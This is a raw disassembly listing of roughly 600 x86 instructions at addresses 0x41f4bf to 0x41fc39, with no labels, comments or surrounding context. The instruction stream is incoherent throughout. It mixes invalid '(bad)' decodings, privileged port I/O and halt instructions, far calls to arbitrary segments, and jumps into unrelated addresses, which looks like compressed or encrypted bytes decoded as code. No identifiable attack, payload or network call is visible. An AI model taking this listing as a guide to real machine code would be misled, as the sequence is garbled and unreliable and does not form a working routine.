  41f4bf:	xor    DWORD PTR [ebp+0x5e049223],edi
  41f4c5:	jb     0x41f529
  41f4c7:	loopne 0x41f44b
  41f4c9:	cmp    BYTE PTR [esi+0x64],cl
  41f4cc:	push   es
  41f4cd:	out    dx,al
  41f4ce:	cmp    BYTE PTR [ecx+edi*1+0x28fd70e4],cl
  41f4d5:	inc    ecx
  41f4d6:	xchg   BYTE PTR [eax+0x67ec9cd7],dl
  41f4dc:	daa    
  41f4dd:	adc    al,0x12
  41f4df:	cli    
  41f4e0:	cmp    ecx,ebx
  41f4e2:	sar    esi,1
  41f4e4:	sahf   
  41f4e5:	inc    ebp
  41f4e6:	ret    
  41f4e7:	mov    dl,0x7
  41f4e9:	daa    
  41f4ea:	cmc    
  41f4eb:	and    esp,edi
  41f4ed:	adc    BYTE PTR [eax+ebx*1-0x1],dl
  41f4f1:	dec    ebx
  41f4f2:	test   dh,al
  41f4f4:	out    dx,al
  41f4f5:	fld    st(0)
  41f4f7:	lock sbb eax,0xbddc7466
  41f4fd:	push   esp
  41f4fe:	(bad)  
  41f4ff:	cs pop edx
  41f501:	fidivr DWORD PTR [ebp+0x61]
  41f504:	lods   al,BYTE PTR ds:[esi]
  41f505:	fcomp  DWORD PTR [ebx+0x1d367edb]
  41f50b:	ror    BYTE PTR [edx-0x77],cl
  41f50e:	cmp    DWORD PTR [esi],ebx
  41f510:	sub    eax,0x5b94e227
  41f515:	loopne 0x41f523
  41f517:	and    al,0x42
  41f519:	pop    ebx
  41f51a:	push   esi
  41f51b:	jg     0x41f4e9
  41f51d:	iret   
  41f51e:	push   ss
  41f51f:	and    eax,0x5f2a908
  41f524:	enter  0x2394,0x69
  41f528:	ret    
  41f529:	cmp    di,WORD PTR [esi+0x56]
  41f52d:	dec    esp
  41f52e:	aad    0x8a
  41f530:	ret    0x739a
  41f533:	les    eax,FWORD PTR [esi-0x4ffb6949]
  41f539:	adc    ebx,DWORD PTR [esi]
  41f53b:	idiv   DWORD PTR [ecx-0x16e1e35a]
  41f541:	into   
  41f542:	retf   0xda85
  41f545:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f546:	repnz pop ebp
  41f548:	add    eax,DWORD PTR [ecx]
  41f54a:	jmp    0x41f52b
  41f54c:	sbb    DWORD PTR [ecx+esi*8],ecx
  41f54f:	enter  0x8159,0xce
  41f553:	hlt    
  41f554:	xor    al,BYTE PTR [edx-0x2f]
  41f557:	shl    DWORD PTR [ecx],cl
  41f559:	mov    edx,0x3b1bd772
  41f55e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f55f:	lahf   
  41f560:	cmp    BYTE PTR [ebx-0x15],bl
  41f563:	adc    dl,BYTE PTR [esi]
  41f565:	icebp  
  41f566:	and    eax,0x7b379dfe
  41f56b:	jnp    0x41f54d
  41f56d:	test   BYTE PTR [esi],0xe9
  41f570:	xor    ah,BYTE PTR [esi-0x6c]
  41f573:	fisubr DWORD PTR [ebp-0x17]
  41f576:	xchg   ebx,eax
  41f577:	ja     0x41f546
  41f579:	dec    edi
  41f57a:	into   
  41f57b:	jl     0x41f5d5
  41f57d:	fstp   QWORD PTR [ecx+edx*1]
  41f580:	fsub   st,st(2)
  41f582:	add    esp,DWORD PTR [ebx+ebp*1]
  41f585:	dec    esi
  41f586:	cwde   
  41f587:	lahf   
  41f588:	pop    esp
  41f589:	mov    dl,0x1
  41f58b:	lods   al,BYTE PTR ds:[esi]
  41f58c:	inc    esi
  41f58d:	and    cl,bl
  41f58f:	or     al,al
  41f591:	aaa    
  41f592:	xchg   edi,eax
  41f593:	mov    WORD PTR [ecx-0x2d467826],ss
  41f599:	pcmpgtd mm1,QWORD PTR [esi]
  41f59c:	pop    ebx
  41f59d:	mov    esp,0xd86fcdb2
  41f5a2:	or     al,0x97
  41f5a4:	lock test eax,0x70fa90eb
  41f5aa:	inc    edi
  41f5ab:	(bad)  
  41f5ac:	dec    edi
  41f5ad:	pop    es
  41f5ae:	mov    eax,es
  41f5b0:	sbb    eax,0xfd4a94e2
  41f5b5:	or     al,0xfc
  41f5b7:	push   edx
  41f5b8:	xchg   edi,eax
  41f5b9:	mov    es,ebp
  41f5bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5bc:	mov    bh,0x78
  41f5be:	sbb    eax,DWORD PTR [edi+ebp*4-0x39ba0724]
  41f5c5:	xor    bl,BYTE PTR [eax+0x4b]
  41f5c8:	xor    ecx,edi
  41f5ca:	sub    BYTE PTR [ebx],bh
  41f5cc:	and    esp,DWORD PTR [ebx-0x71a6925f]
  41f5d2:	dec    esp
  41f5d3:	popa   
  41f5d4:	ror    dh,0xd
  41f5d7:	mov    WORD PTR [esi-0x10],ds
  41f5da:	dec    ecx
  41f5db:	mov    edx,0x69f70f55
  41f5e0:	mov    esi,DWORD PTR [edi+edi*2-0xa714648]
  41f5e7:	pop    edx
  41f5e8:	mov    ecx,0x68996f39
  41f5ed:	addr16 inc ebp
  41f5ef:	rcr    BYTE PTR [edi],0x42
  41f5f2:	pusha  
  41f5f3:	in     al,0x49
  41f5f5:	jecxz  0x41f5be
  41f5f7:	retf   
  41f5f8:	test   al,0x6b
  41f5fa:	mov    BYTE PTR [ecx],bh
  41f5fc:	and    eax,0xac855693
  41f601:	push   ss
  41f602:	data16 in al,0xc5
  41f605:	jne    0x41f5a8
  41f607:	xchg   edi,eax
  41f608:	int3   
  41f609:	call   0x7021:0x7399fb33
  41f610:	iret   
  41f611:	jge    0x41f665
  41f613:	loop   0x41f5e9
  41f615:	dec    eax
  41f616:	xor    edi,ecx
  41f618:	js     0x41f645
  41f61a:	mov    ch,0x7d
  41f61c:	or     eax,0xbeeeeb3b
  41f621:	mov    ?,WORD PTR [esi-0x7a64f924]
  41f627:	leave  
  41f628:	mov    ds:0x967def88,al
  41f62d:	mov    al,0xa9
  41f62f:	sub    eax,0x335cdd74
  41f634:	cmp    BYTE PTR [esi+0x27],ah
  41f637:	pop    ebp
  41f638:	aam    0x2
  41f63a:	(bad)  
  41f63b:	aad    0xa9
  41f63d:	push   ecx
  41f63e:	call   0x752:0x3853be0b
  41f645:	loop   0x41f69c
  41f647:	addr16 dec eax
  41f649:	xchg   ecx,eax
  41f64a:	js     0x41f682
  41f64c:	int    0x95
  41f64e:	sahf   
  41f64f:	icebp  
  41f650:	push   edx
  41f651:	shl    BYTE PTR [esi],0xf5
  41f654:	adc    al,0xa0
  41f656:	xchg   edi,eax
  41f657:	(bad)  
  41f658:	cmp    DWORD PTR [edx-0x139fe35],edx
  41f65e:	push   0x99db3e88
  41f663:	inc    ebp
  41f664:	push   edx
  41f665:	jl     0x41f691
  41f667:	adc    al,0x51
  41f669:	xchg   ebx,eax
  41f66a:	mov    ah,0xf9
  41f66c:	pop    eax
  41f66d:	inc    esp
  41f66e:	out    0xc2,eax
  41f670:	aad    0x4b
  41f672:	mov    ebp,0x974e79ba
  41f677:	repnz daa 
  41f679:	repnz fld QWORD PTR [ecx+0x451bf874]
  41f680:	mov    WORD PTR [edx+ebx*2],?
  41f683:	mov    eax,0x40d0100
  41f688:	sbb    dl,BYTE PTR [ecx+edx*8]
  41f68b:	mov    eax,0xe0b55b5f
  41f690:	xlat   BYTE PTR ds:[ebx]
  41f691:	xchg   ecx,eax
  41f692:	xor    BYTE PTR [ebx+ebp*8-0x5f5f46fe],0x8
  41f69a:	jecxz  0x41f653
  41f69c:	or     bl,BYTE PTR [ebp-0x26690137]
  41f6a2:	adc    DWORD PTR [ebx-0x738c7dec],ebx
  41f6a8:	or     eax,0x465a04b3
  41f6ad:	(bad)  
  41f6ae:	push   esp
  41f6af:	pop    ds
  41f6b0:	retf   0x86ff
  41f6b3:	sbb    al,0x5f
  41f6b6:	add    DWORD PTR [edi*8+0x53fb8af2],0x79
  41f6be:	cmp    dh,0x73
  41f6c1:	div    DWORD PTR [edi]
  41f6c3:	pop    edi
  41f6c4:	mov    ebp,0x663deba1
  41f6c9:	mov    esp,0x63e639d2
  41f6ce:	and    ah,BYTE PTR [ebx-0x6257d356]
  41f6d4:	and    BYTE PTR [edx-0x48d69f97],cl
  41f6da:	cdq    
  41f6db:	ins    BYTE PTR es:[edi],dx
  41f6dc:	cli    
  41f6dd:	dec    edx
  41f6de:	sub    dl,dl
  41f6e0:	mov    cs:0xf42fdaff,eax
  41f6e6:	sub    al,0x2
  41f6e8:	fisttp WORD PTR [ebx+0x51]
  41f6eb:	cwde   
  41f6ec:	not    BYTE PTR [ebp-0x61ddd661]
  41f6f2:	bound  ebp,QWORD PTR [edx-0x4eb27860]
  41f6f8:	fnstcw WORD PTR [ecx+eiz*8+0x4cb6ba77]
  41f6ff:	cld    
  41f700:	(bad)  
  41f701:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f702:	inc    ebx
  41f703:	test   BYTE PTR [edx],ah
  41f705:	aas    
  41f706:	bound  ebp,QWORD PTR [esi]
  41f708:	xlat   BYTE PTR ds:[ebx]
  41f709:	adc    dh,BYTE PTR [ecx-0x73f37a06]
  41f70f:	jb     0x41f6ba
  41f711:	popf   
  41f712:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f713:	mov    WORD PTR [esi-0x52165e36],es
  41f719:	xor    BYTE PTR ds:[ecx],0xd2
  41f71d:	sub    DWORD PTR [esi*2+0x5065de92],esp
  41f724:	mov    al,ds:0xca42200c
  41f729:	fst    st(4)
  41f72b:	push   cs
  41f72c:	(bad)  
  41f72d:	std    
  41f72e:	and    ebp,ecx
  41f730:	addr16 xor al,0xf
  41f733:	ins    DWORD PTR es:[edi],dx
  41f734:	sub    al,0xb5
  41f736:	jnp    0x41f6e9
  41f738:	xor    BYTE PTR [ecx],0x4d
  41f73b:	cli    
  41f73c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f73d:	push   es
  41f73e:	or     al,0x5d
  41f740:	pop    edx
  41f741:	ja     0x41f700
  41f743:	mov    esp,0xb30cbaa3
  41f748:	(bad)  
  41f749:	pop    DWORD PTR [edi+0x1882865f]
  41f74f:	ss loope 0x41f777
  41f752:	adc    bh,BYTE PTR [eax-0x3]
  41f755:	push   ebx
  41f756:	xchg   ebx,eax
  41f757:	pop    edi
  41f758:	adc    DWORD PTR [ebx],ebp
  41f75a:	pop    edx
  41f75b:	popf   
  41f75c:	mov    ecx,0xdaed6ca2
  41f761:	jmp    0x41f6f7
  41f763:	out    dx,al
  41f764:	sub    edx,DWORD PTR [ecx-0x12905872]
  41f76a:	lea    esp,[ebx+eiz*8]
  41f76d:	and    bh,BYTE PTR [ebx]
  41f76f:	call   0x8ad0a88e
  41f774:	jae    0x41f7cd
  41f776:	das    
  41f777:	xchg   edx,eax
  41f778:	push   esi
  41f779:	cmp    eax,0x9cd96686
  41f77e:	mov    ecx,0xcd5b777e
  41f784:	jb     0x41f7cf
  41f786:	push   ecx
  41f787:	sbb    DWORD PTR [edx+0xb02c864],esp
  41f78d:	pusha  
  41f78e:	lock imul esi,DWORD PTR [edx],0x4bcf1d9
  41f795:	out    dx,eax
  41f796:	pop    ecx
  41f797:	pusha  
  41f798:	(bad)  
  41f799:	hlt    
  41f79a:	ror    BYTE PTR [ebx-0x33],0x68
  41f79e:	bound  ecx,QWORD PTR [edi+0x19]
  41f7a1:	pop    ds
  41f7a2:	ror    BYTE PTR [edx-0x14fa0641],1
  41f7a8:	retf   0xd0d0
  41f7ab:	fs jle 0x41f819
  41f7ae:	outs   dx,BYTE PTR ds:[esi]
  41f7af:	mov    eax,ds:0x663840a2
  41f7b4:	pop    ebp
  41f7b5:	test   al,0x67
  41f7b7:	cmp    BYTE PTR [edi-0xd],dl
  41f7ba:	cs mov cl,0xc8
  41f7bd:	scas   al,BYTE PTR es:[edi]
  41f7be:	inc    esi
  41f7bf:	sar    DWORD PTR [ecx+0x2e],cl
  41f7c2:	icebp  
  41f7c3:	fidiv  WORD PTR [edi+0x12cc8dbc]
  41f7c9:	sub    DWORD PTR [edi+ecx*4-0x54],ebx
  41f7cd:	xchg   DWORD PTR [ecx*4-0x1faaaf7f],eax
  41f7d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7d5:	loope  0x41f83d
  41f7d7:	dec    edx
  41f7d8:	dec    edx
  41f7d9:	or     al,BYTE PTR [eax+eax*4]
  41f7dc:	sbb    dh,dh
  41f7de:	jae    0x41f7d8
  41f7e0:	fistp  WORD PTR [ebp+eax*4+0xe]
  41f7e4:	dec    edx
  41f7e5:	clc    
  41f7e6:	cs test eax,0x5a1ddda9
  41f7ec:	cmp    DWORD PTR [edi+0x6f],0xffffffa7
  41f7f0:	cmp    ah,ah
  41f7f2:	bound  esp,QWORD PTR [edx+0x2]
  41f7f5:	pop    ds
  41f7f6:	retf   
  41f7f7:	push   edi
  41f7f8:	add    dh,BYTE PTR [ecx-0x35c9cb59]
  41f7fe:	dec    eax
  41f7ff:	mov    bh,0xe2
  41f801:	daa    
  41f802:	push   ebp
  41f803:	sbb    ecx,DWORD PTR [ecx-0x562255ce]
  41f809:	les    esi,FWORD PTR [edi]
  41f80b:	mov    esi,0xa55412c0
  41f810:	adc    cl,BYTE PTR [eax+0x1c]
  41f813:	shr    BYTE PTR [eax-0x15725aab],1
  41f819:	inc    ebp
  41f81a:	pop    ecx
  41f81b:	and    cl,BYTE PTR [ebx+0x43]
  41f81e:	dec    eax
  41f81f:	or     eax,0xbd597277
  41f824:	mov    DWORD PTR [eax],edi
  41f826:	shl    DWORD PTR ds:0x5f3435e,1
  41f82c:	sbb    ah,dh
  41f82e:	into   
  41f82f:	(bad)  [edi+ebx*8]
  41f832:	fwait
  41f833:	jb     0x41f826
  41f835:	jno    0x41f879
  41f837:	lahf   
  41f838:	fcomip st,st(6)
  41f83a:	mov    ecx,0x84840cc0
  41f83f:	pop    esi
  41f840:	xor    eax,DWORD PTR [ebx]
  41f842:	loope  0x41f82e
  41f844:	cli    
  41f845:	repz dec esp
  41f847:	call   0x8493:0x5ab0aee5
  41f84e:	ja     0x41f818
  41f850:	adc    DWORD PTR [edi],eax
  41f852:	adc    DWORD PTR [ecx-0x2c343be3],eax
  41f858:	dec    ebx
  41f859:	outs   dx,BYTE PTR ds:[esi]
  41f85a:	les    esi,FWORD PTR [esi]
  41f85c:	mov    eax,0xa6a286d2
  41f861:	pop    ds
  41f862:	xchg   esi,eax
  41f863:	fisttp QWORD PTR ds:0x44986e72
  41f869:	stos   DWORD PTR es:[edi],eax
  41f86a:	dec    esp
  41f86b:	pop    eax
  41f86c:	imul   esp,DWORD PTR [edi-0x7],0x2d4515c7
  41f873:	rcl    DWORD PTR [esi+ebp*8+0x78325a6d],cl
  41f87a:	shl    BYTE PTR [edx-0x40],0xde
  41f87e:	ins    BYTE PTR es:[edi],dx
  41f87f:	in     al,0x5c
  41f881:	inc    eax
  41f882:	repnz cmp al,0x84
  41f885:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f886:	sti    
  41f887:	pop    esp
  41f888:	xchg   ebx,eax
  41f889:	imul   edx,DWORD PTR [eax-0x31e185d5],0xffffffc9
  41f890:	mov    edi,0xc76efee
  41f895:	cmp    al,BYTE PTR [ecx]
  41f897:	and    ebx,edi
  41f899:	inc    ebx
  41f89a:	ror    ebx,1
  41f89c:	sbb    eax,0xa5a7cfad
  41f8a1:	adc    eax,0x2f903926
  41f8a6:	repz pop eax
  41f8a8:	pop    ds
  41f8a9:	mov    al,0xc6
  41f8ab:	xor    BYTE PTR [ebx-0x5c],bl
  41f8ae:	fsubr  st(4),st
  41f8b0:	lods   al,BYTE PTR ds:[esi]
  41f8b1:	mov    ebp,0xd9a0cfff
  41f8b6:	cmp    BYTE PTR ds:0x20864a2c,bl
  41f8bc:	bound  eax,QWORD PTR [edx]
  41f8be:	(bad)  
  41f8bf:	xchg   esp,eax
  41f8c0:	xor    dl,BYTE PTR [eax+0x21e9a870]
  41f8c6:	add    DWORD PTR [ecx],esi
  41f8c8:	into   
  41f8c9:	mov    edi,DWORD PTR ds:0xbc37e556
  41f8cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8d0:	inc    edi
  41f8d1:	jmp    0xc1700b25
  41f8d6:	xor    BYTE PTR [ecx*4-0x31ab46be],ah
  41f8dd:	cmc    
  41f8de:	cs adc eax,0xa2aa9d80
  41f8e4:	ss fwait
  41f8e6:	adc    ah,bl
  41f8e8:	loope  0x41f94c
  41f8ea:	clc    
  41f8eb:	adc    edi,DWORD PTR ds:0xb3d46580
  41f8f1:	xlat   BYTE PTR ds:[ebx]
  41f8f2:	sub    ecx,DWORD PTR [ecx-0x7]
  41f8f5:	scas   al,BYTE PTR es:[edi]
  41f8f6:	sbb    al,0x1c
  41f8f8:	pop    esi
  41f8f9:	cmp    edi,DWORD PTR [eax+eiz*2]
  41f8fc:	mov    ds:0xba93b0df,eax
  41f901:	pushf  
  41f902:	js     0x41f8d5
  41f904:	inc    esp
  41f905:	div    edi
  41f907:	pop    ebx
  41f908:	pop    ebp
  41f909:	mov    bh,0x7c
  41f90b:	test   eax,0xbd6164d0
  41f910:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f911:	cli    
  41f912:	fwait
  41f913:	jne    0x41f92c
  41f915:	xor    eax,0x978a7d5b
  41f91a:	jle    0x41f970
  41f91c:	popf   
  41f91d:	cmp    edx,ebp
  41f91f:	sbb    bl,ah
  41f921:	jmp    0xaded:0x533e43cc
  41f928:	push   ds
  41f929:	add    DWORD PTR [ecx],esi
  41f92b:	loop   0x41f984
  41f92d:	mov    bh,BYTE PTR [ebx-0x7fefb3e2]
  41f933:	iret   
  41f934:	pop    edx
  41f935:	sub    DWORD PTR ds:0xcbb43eda,esi
  41f93b:	mov    ebx,0x905aef8e
  41f940:	loopne 0x41f8dd
  41f942:	inc    edx
  41f943:	cld    
  41f944:	ins    BYTE PTR es:[edi],dx
  41f945:	mov    cl,0x86
  41f947:	mov    esp,DWORD PTR [edi-0x7bda8ef9]
  41f94d:	sbb    BYTE PTR [edi],al
  41f94f:	or     eax,0x81392335
  41f954:	sub    BYTE PTR [edx+0x6d445e56],0x65
  41f95b:	dec    esp
  41f95c:	push   eax
  41f95d:	imul   edi,DWORD PTR [ecx*1-0x4bbd3354],0x226c0b7f
  41f968:	pop    edx
  41f969:	dec    ebp
  41f96a:	sbb    dl,BYTE PTR [eax]
  41f96c:	popf   
  41f96d:	cmp    eax,ebp
  41f96f:	adc    DWORD PTR [ebp-0x36],0xffffff91
  41f973:	mov    dh,0x5c
  41f975:	pop    esi
  41f976:	add    al,0x39
  41f978:	mov    ebx,0x3bff24d9
  41f97d:	nop
  41f97e:	popa   
  41f97f:	ficomp DWORD PTR [edx+0x48]
  41f982:	pop    es
  41f983:	xchg   ebx,eax
  41f984:	mov    es,WORD PTR [ebx+0x10]
  41f987:	(bad)  
  41f988:	fdiv   QWORD PTR [eax]
  41f98a:	adc    al,0x7
  41f98c:	sub    eax,0xea1d8b44
  41f991:	repnz xlat BYTE PTR ds:[ebx]
  41f993:	mov    bl,BYTE PTR [ebx+0x2c]
  41f996:	es jmp 0xdaf9db32
  41f99c:	stc    
  41f99d:	cmc    
  41f99e:	imul   edi,DWORD PTR [esi+0x62],0x8e164b87
  41f9a5:	dec    eax
  41f9a6:	and    eax,0xb5636214
  41f9ab:	lods   eax,DWORD PTR ds:[esi]
  41f9ac:	in     al,dx
  41f9ad:	add    BYTE PTR [ecx],cl
  41f9af:	mov    edx,0xad6974b7
  41f9b4:	nop
  41f9b5:	in     al,dx
  41f9b6:	push   edi
  41f9b7:	(bad)  
  41f9b8:	shr    BYTE PTR [edi+eiz*4],1
  41f9bb:	frstor [eax-0x266ea954]
  41f9c1:	dec    ebx
  41f9c2:	int    0x66
  41f9c4:	inc    edi
  41f9c5:	pop    eax
  41f9c6:	lds    ebx,FWORD PTR [edx+0x355cd1c1]
  41f9cc:	xor    BYTE PTR [eax+eiz*4-0x51],al
  41f9d0:	std    
  41f9d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9d2:	mov    esp,0xf080751b
  41f9d7:	mov    ch,0x1f
  41f9d9:	or     BYTE PTR [ecx+0x7958a724],0x38
  41f9e0:	or     dl,BYTE PTR [edi]
  41f9e2:	push   edx
  41f9e3:	hlt    
  41f9e4:	push   eax
  41f9e5:	fsubr  QWORD PTR [edx]
  41f9e7:	mov    ds:0xf9ed57f5,eax
  41f9ec:	lahf   
  41f9ed:	sti    
  41f9ee:	rol    DWORD PTR [esi+0x7289131d],cl
  41f9f4:	call   0x93ff:0x6ecd7cff
  41f9fb:	mov    al,ds:0xc63bfcf9
  41fa00:	out    0xbd,al
  41fa02:	and    al,0xc0
  41fa04:	xchg   DWORD PTR [edi],ebx
  41fa06:	dec    edi
  41fa07:	mov    ds:0xee4cbd8b,eax
  41fa0c:	push   edi
  41fa0d:	imul   ecx,DWORD PTR [eax+0x79e35c4c],0xeddb749f
  41fa17:	add    al,0x11
  41fa19:	add    DWORD PTR ds:0x57fa6c45,eax
  41fa1f:	fninit 
  41fa21:	xor    dl,dh
  41fa23:	dec    DWORD PTR [edx-0x30]
  41fa26:	stc    
  41fa27:	adc    eax,0xef4adfdd
  41fa2c:	shr    eax,0xac
  41fa2f:	xlat   BYTE PTR ds:[ebx]
  41fa30:	xor    BYTE PTR [edi+0x3d07aa7e],bl
  41fa36:	test   eax,0xae82eb89
  41fa3b:	or     eax,0x183cdcad
  41fa40:	cmp    esi,DWORD PTR [edi]
  41fa42:	push   edi
  41fa43:	mov    ch,0xda
  41fa45:	mov    ecx,0xc4d05338
  41fa4a:	xchg   DWORD PTR [edi-0x14],edx
  41fa4d:	ret    0x47ae
  41fa50:	sub    eax,DWORD PTR [eax]
  41fa52:	cli    
  41fa53:	not    esp
  41fa55:	sub    BYTE PTR [ecx],al
  41fa57:	dec    eax
  41fa58:	(bad)  
  41fa59:	fcmovnbe st,st(5)
  41fa5b:	jmp    0x41f9fc
  41fa5d:	hlt    
  41fa5e:	push   ds
  41fa5f:	cs inc edi
  41fa61:	loop   0x41fa2b
  41fa63:	sbb    ebx,DWORD PTR [ecx+0x0]
  41fa66:	xor    esp,edi
  41fa68:	push   ds
  41fa69:	dec    ebp
  41fa6a:	jecxz  0x41fa80
  41fa6c:	mov    dh,0x18
  41fa6e:	mov    ds:0xc8bdae1f,al
  41fa73:	mov    DWORD PTR [edx-0x78],edi
  41fa76:	pop    ebx
  41fa77:	adc    al,0xe6
  41fa79:	test   BYTE PTR [ebx+eiz*2+0xc],dh
  41fa7d:	dec    ecx
  41fa7e:	stos   DWORD PTR es:[edi],eax
  41fa7f:	dec    ecx
  41fa80:	mov    ecx,0x2cf7053e
  41fa85:	push   cs
  41fa86:	pop    esp
  41fa87:	aas    
  41fa88:	inc    ecx
  41fa89:	cmc    
  41fa8a:	ret    
  41fa8b:	loop   0x41fa99
  41fa8d:	sti    
  41fa8e:	fdiv   QWORD PTR [ecx]
  41fa90:	xchg   BYTE PTR [ebx-0x58],dl
  41fa93:	stc    
  41fa94:	mov    al,0x26
  41fa96:	xchg   edi,eax
  41fa97:	rcr    BYTE PTR [edx+0x4ca0722b],cl
  41fa9d:	sub    cl,BYTE PTR [edx-0x63]
  41faa0:	add    BYTE PTR [ebx],al
  41faa2:	fs and al,0xf0
  41faa5:	out    dx,al
  41faa6:	test   eax,0x59476ef7
  41faab:	mov    cl,0x63
  41faad:	cwde   
  41faae:	js     0x41fb19
  41fab0:	fisttp DWORD PTR ds:0x73895fd6
  41fab6:	stos   DWORD PTR es:[edi],eax
  41fab7:	and    al,BYTE PTR [eax+0xd0d70fe]
  41fabd:	je     0x41fb1b
  41fabf:	lods   ax,WORD PTR ds:[esi]
  41fac1:	push   cs
  41fac2:	test   BYTE PTR [edx],cl
  41fac4:	stos   BYTE PTR es:[edi],al
  41fac5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fac6:	sub    eax,esp
  41fac8:	out    dx,eax
  41fac9:	jp     0x41fa80
  41facb:	mov    ah,0xdf
  41facd:	in     al,dx
  41face:	scas   al,BYTE PTR es:[edi]
  41facf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fad0:	xor    DWORD PTR [ebp+0x629b8479],edx
  41fad6:	push   eax
  41fad7:	sub    DWORD PTR [eax-0x4c],ebp
  41fada:	lahf   
  41fadb:	retf   
  41fadc:	imul   esp,edx,0xaaa296ab
  41fae2:	or     ebp,DWORD PTR [ebx]
  41fae4:	aad    0xe
  41fae6:	inc    eax
  41fae7:	(bad)  
  41fae8:	push   esi
  41fae9:	push   ecx
  41faea:	ja     0x41fa70
  41faec:	xchg   DWORD PTR [ecx+eax*2-0x32],esp
  41faf0:	sar    BYTE PTR [ebp-0x13],1
  41faf3:	sar    BYTE PTR [ebp-0x6d7507b8],1
  41faf9:	in     eax,0xf9
  41fafb:	std    
  41fafc:	stos   DWORD PTR es:[edi],eax
  41fafd:	sub    eax,0x36809a8f
  41fb02:	jmp    0xb10f57e8
  41fb07:	push   esi
  41fb08:	rol    ah,cl
  41fb0a:	mov    ecx,DWORD PTR [ecx]
  41fb0c:	or     edi,DWORD PTR [ebp+0x1bc98d08]
  41fb12:	fild   DWORD PTR [ebx+0x4956c933]
  41fb18:	xor    dh,dh
  41fb1a:	sub    BYTE PTR [edi+0x61e55f62],cl
  41fb20:	inc    edi
  41fb21:	jns    0x41fb57
  41fb23:	jecxz  0x41fb35
  41fb25:	or     eax,edx
  41fb27:	pop    es
  41fb28:	add    BYTE PTR ds:0x37e081a6,0xf5
  41fb2f:	aam    0x4d
  41fb31:	cdq    
  41fb32:	test   DWORD PTR [esp+ebx*1+0x791d894a],ebp
  41fb39:	popa   
  41fb3a:	inc    ebx
  41fb3b:	popf   
  41fb3c:	sbb    eax,0xafce2b1d
  41fb41:	pop    ss
  41fb42:	pop    eax
  41fb43:	add    DWORD PTR [ebp+0x43],eax
  41fb46:	scas   al,BYTE PTR es:[edi]
  41fb47:	sbb    BYTE PTR [edi+0x45e7e857],bl
  41fb4d:	call   0x875c:0xdbb09b6
  41fb54:	sub    eax,0xb81f56ec
  41fb59:	xchg   ebx,eax
  41fb5a:	je     0x41fade
  41fb5c:	jns    0x41fb5f
  41fb5e:	les    esi,FWORD PTR [ebx-0x2e80afd7]
  41fb64:	repnz dec ebx
  41fb66:	les    edx,FWORD PTR [ebp-0x44]
  41fb69:	outs   dx,DWORD PTR ds:[esi]
  41fb6a:	mov    BYTE PTR [ebp+0x5046ecdb],dl
  41fb70:	in     al,dx
  41fb71:	adc    eax,0x19fa0715
  41fb76:	iret   
  41fb77:	fcmove st,st(2)
  41fb79:	test   bh,dh
  41fb7b:	pushf  
  41fb7c:	and    bl,cl
  41fb7e:	jne    0x41fbeb
  41fb80:	imul   esi,DWORD PTR [ecx-0x38],0x3e
  41fb84:	or     eax,0x33643826
  41fb89:	and    BYTE PTR [ecx-0x13],bl
  41fb8c:	sbb    DWORD PTR [edi-0x6921996e],edi
  41fb92:	dec    ebx
  41fb93:	jns    0x41fb62
  41fb95:	jle    0x41fb3d
  41fb97:	dec    edx
  41fb98:	sbb    eax,0xf189142e
  41fb9d:	test   DWORD PTR [esi-0x629f5e1f],0xb4d01437
  41fba7:	xor    eax,0xf001da67
  41fbac:	ror    DWORD PTR [esi+0x2895f68c],0x9a
  41fbb3:	mov    es,WORD PTR [ecx+edx*4]
  41fbb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbb7:	rol    al,cl
  41fbb9:	inc    ecx
  41fbba:	jo     0x41fbcb
  41fbbc:	sbb    al,0xc9
  41fbbe:	out    0x3b,eax
  41fbc0:	dec    esp
  41fbc1:	xchg   edx,eax
  41fbc2:	(bad)  [eax+0x3f7ebe66]
  41fbc8:	mov    cs:0xa8aeb403,al
  41fbce:	stos   BYTE PTR es:[edi],al
  41fbcf:	loop   0x41fb7b
  41fbd1:	adc    eax,DWORD PTR [ecx]
  41fbd3:	ja     0x41fb6d
  41fbd5:	test   eax,0xfd1e715b
  41fbda:	test   al,0xf5
  41fbdc:	sbb    DWORD PTR [edi-0x1a],edi
  41fbdf:	stc    
  41fbe0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbe1:	xor    ah,0x71
  41fbe4:	push   ebx
  41fbe5:	jb     0x41fbaf
  41fbe7:	pusha  
  41fbe8:	div    DWORD PTR [ebp+0x6c]
  41fbeb:	cmp    DWORD PTR [eax-0x6d],edi
  41fbee:	rcr    ebp,1
  41fbf0:	test   DWORD PTR [ebp+0x478defd6],esi
  41fbf6:	sbb    BYTE PTR [eax+0x45],ch
  41fbf9:	push   esp
  41fbfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbfb:	call   0x22979cea
  41fc00:	mov    dl,0x88
  41fc02:	cwde   
  41fc03:	jb     0x41fc1b
  41fc05:	inc    ebp
  41fc06:	mov    esi,0x92a5cdfd
  41fc0b:	sub    esi,0x6cbb16e8
  41fc11:	aad    0x7a
  41fc13:	stc    
  41fc14:	pusha  
  41fc15:	inc    BYTE PTR [esp+ebx*4]
  41fc18:	aad    0xe5
  41fc1a:	loope  0x41fc29
  41fc1c:	jp     0x41fc2f
  41fc1e:	ja     0x41fbc6
  41fc20:	ins    DWORD PTR es:[edi],dx
  41fc21:	sar    cl,0x3e
  41fc24:	popf   
  41fc25:	adc    al,0xac
  41fc27:	repz or bh,BYTE PTR [esi+0x11]
  41fc2b:	outs   dx,DWORD PTR ds:[esi]
  41fc2c:	push   ss
  41fc2d:	dec    edx
  41fc2e:	jg     0x41fc55
  41fc30:	lock or eax,0x384dede5
  41fc36:	retf   
  41fc37:	addr16 inc esi
  41fc39:	pop    edi
